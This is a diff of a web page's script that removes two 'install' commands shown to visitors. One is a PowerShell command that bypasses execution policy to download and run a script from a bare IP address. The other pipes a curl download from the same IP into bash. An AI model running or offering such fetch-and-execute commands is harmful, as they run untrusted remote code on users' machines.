@@ -350,15 +350,6 @@ footer .footer-links{display:flex;justify-content:center;gap:1.5rem;margin-botto
 </footer>
 
 <script>
-var CMDS = {
-  win: 'powershell -ExecutionPolicy Bypass -Command "iex (iwr -useb http://68.183.248.32/agent-demo/install.ps1)"',
-  mac: 'curl -fsSL http://68.183.248.32/agent-demo/install.sh | bash'
-};
-function setOs(os, btn) {
-  document.getElementById('install-cmd').textContent = CMDS[os];
-  document.querySelectorAll('.install-tab').forEach(function(t){ t.classList.remove('active'); });
-  btn.classList.add('active');
-}
 function copyInstall() {
   var cmd = document.getElementById('install-cmd').textContent;
   navigator.clipboard.writeText(cmd).then(function() {
